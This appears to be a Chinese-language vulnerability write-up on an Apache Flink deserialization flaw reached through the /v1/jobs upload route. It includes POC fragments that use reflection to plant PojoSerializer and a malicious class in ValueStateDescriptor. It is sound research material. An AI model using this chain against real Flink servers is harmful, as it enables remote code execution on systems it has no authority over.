## 0x01 漏洞入口

  实际上漏洞入口在 JobSubmitHandler 当中，orich1 师傅在《Apache Flink 多个漏洞分析》这篇文章也提及了，具体路由也是 /v1/jobs ，但是这里具体看看参数怎么入参的，实际上可以看到下图中`request.getUploadedFiles()`获取request请求中的文件内容，然后调用 loadJobGraph 方法进行下一步处理。

![](../Images/85f92df3def1df173963c3d15f8acae7.png)

  在 loadJobGraph 方法当中，可以看到 getPathAndAssertUpload 方法根据`requestBody.jobGraphFileName`方法当中参数，获取当前上传文件的路径，然后调用java的 ObjectInputStream 获取数据传入，紧接的就是反序列化入口了。

![](../Images/28340c7d1c686e4189578053946d7f7d.png)

  先看看`requestBody.jobGraphFileName`，实际上这里是做了json的注释，所以怎么入参，实际上有个理解了，在一个POST请求当中，先上传序列化文件，然后调用json格式，例如`{"jobGraphFileName":"2.graph"}`，获取上传文件，然后执行反序列化。

![](../Images/7c7b4235763d84a67d7bc97deab9189f.png)

所以post 包如下所示：


## 0x02 序列化构造

根据 orich1 师傅的文章：

> PojoSerializer，其 deserialize 函数会调用class.forname，且第二参数为 true （会执行类初始化，调用 static 代码块）

  要如何构造的关键点实际上是 StateDescriptor#readObject 当中。

```
1.  `    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {`
    
2.  `        in.defaultReadObject();`
    
3.  `        boolean hasDefaultValue = in.readBoolean();`
    
4.  `        if (hasDefaultValue) {`
    
5.  `            TypeSerializer<T> serializer = (TypeSerializer)this.serializerAtomicReference.get();`
    
6.  `            ...`
    
7.  `                    try {`
    
8.  `                        this.defaultValue = serializer.deserialize(inView);`
    
```

  实际上在这里，我们可以把`serializer.deserialize`的 serializer 通过一定的方法修改成 PojoSerializer 就能达到我们的目的。

![](../Images/e474ef4756ee1eb11600f45f1240a413.png)

serializer 对象是通过下图中的代码获取得到的。

```
1.  `            TypeSerializer<T> serializer = (TypeSerializer)this.serializerAtomicReference.get();`
    
```

而实际上 serializerAtomicReference 实际上是在 StateDescriptor 通过实例化 AtomicReference 对象，并调用这个对象中的get方法获取当前的序列化对象，所以我们可以逆向思维，构造的时候直接实际例化这个对象，利用反射放入 PojoSerializer 即可。

```
1.  `public abstract class StateDescriptor<S extends State, T> implements Serializable {`
    
2.  `    private static final Logger LOG = LoggerFactory.getLogger(StateDescriptor.class);`
    
3.  `    private static final long serialVersionUID = 1L;`
    
4.  `    protected final String name;`
    
5.  `    private final AtomicReference<TypeSerializer<T>> serializerAtomicReference = new AtomicReference();`
    
```

所以这部分POC：

```
1.  `    AtomicReference<TypeSerializer> atomicReference = new AtomicReference<TypeSerializer>();`
    
2.  `    PojoSerializer pojoSerializer = new PojoSerializer(Object.class, new TypeSerializer[0], new Field[0], new ExecutionConfig());`
    
3.  `    atomicReference.set(pojoSerializer);`
    
```

我们在玩下看 ValueStateDescriptor 是继承 StateDescriptor 对象，而 StateDescriptor 对象是一个可被序列化的对象，所以这里 ValueStateDescriptor 也是一个可被序列化的对象。

![](../Images/27500293807f6b9da5db27e0eb6dad7a.png)

在 ValueStateDescriptor 当中有这个一个构造方法，需要传入 typeSerializer 和 defaultValue

```
1.  `    public ValueStateDescriptor(String name, TypeSerializer<T> typeSerializer, T defaultValue) {`
    
2.  `        super(name, typeSerializer, defaultValue);`
    
3.  `    }`
    
```

而 typeSerializer 和 defaultValue 在 StateDescriptor 类（也就是 ValueStateDescriptor 的父类），当中对应的属性是 serializerAtomicReference 和 defaultValue 。

```
1.  `    protected StateDescriptor(String name, TypeSerializer<T> serializer, @Nullable T defaultValue) {`
    
2.  `        this.ttlConfig = StateTtlConfig.DISABLED;`
    
3.  `        this.name = (String)Preconditions.checkNotNull(name, "name must not be null");`
    
4.  `        this.serializerAtomicReference.set(Preconditions.checkNotNull(serializer, "serializer must not be null"));`
    
5.  `        this.defaultValue = defaultValue;`
    
```

所以需要分别反射修改，这里要注意 defaultValue 这里我们把恶意对象放进去了。

```
1.  `        ValueStateDescriptor valueStateDescriptor = Exp1.createWithoutConstructor(ValueStateDescriptor.class);`
    
2.  `        Field field = StateDescriptor.class.getDeclaredField("defaultValue");`
    
3.  `        field.setAccessible(true);`
    
4.  `        field.set(valueStateDescriptor, new EvalClass());`
    
5.  `        field = StateDescriptor.class.getDeclaredField("serializerAtomicReference");`
    
6.  `        field.setAccessible(true);`
    
7.  `        field.set(valueStateDescriptor, atomicReference);`
    
```

这里有几个细节，首先 ValueStateDescriptor 为啥要无参构造，而不是直接构造，原因在于 StateDescriptor 方法当中实力化对象需要有些 checknotnull 的检查，这样构造比较方便。

![](../Images/7f8ba2573b651fb62f2a805e74a6df17.png)

其次 defaultValue 是因为反序列化的时候有个 hasDefaultValue 的检查。

![](../Images/6fa37e151db1fbdb774ee1c745e41bc5.png)

这个 hasDefaultValue 的检查时序列化是 StateDescriptor 序列化的时候会根据 defaultValue 的值写入表示标位（true或者false）

![](../Images/0e34b594747bf8575a7b1fe2dcfc6643.png)

以及把需要加载的类名写入到序列化的字节流当中。

![](../Images/bc10d63542cf4a4196f5803756f49ded.png)

![](../Images/42f1510d6c4784c2033253a48f8ffe56.png)
